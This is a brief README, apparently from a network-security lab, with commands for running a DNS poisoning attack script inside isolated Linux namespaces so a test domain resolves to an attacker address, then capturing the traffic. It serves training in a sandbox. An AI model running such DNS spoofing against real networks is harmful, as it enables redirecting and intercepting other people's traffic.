# DNS Poisoning

## Goal
Spoof DNS replies so `target.lab` resolves to attacker IP (`10.0.0.2`).

## Run
```bash
sudo ip netns exec ns-atk python3 attacks/03-dns-poison/poison.py \
  --iface veth-atk \
  --domain target.lab \
  --spoof-ip 10.0.0.2
```

## Trigger lookup
```bash
sudo ip netns exec ns-srv nslookup target.lab 10.0.0.53
```

## Capture
```bash
sudo ip netns exec ns-atk tcpdump -ni veth-atk udp port 53 -w captures/03-dns-poison.pcap
```
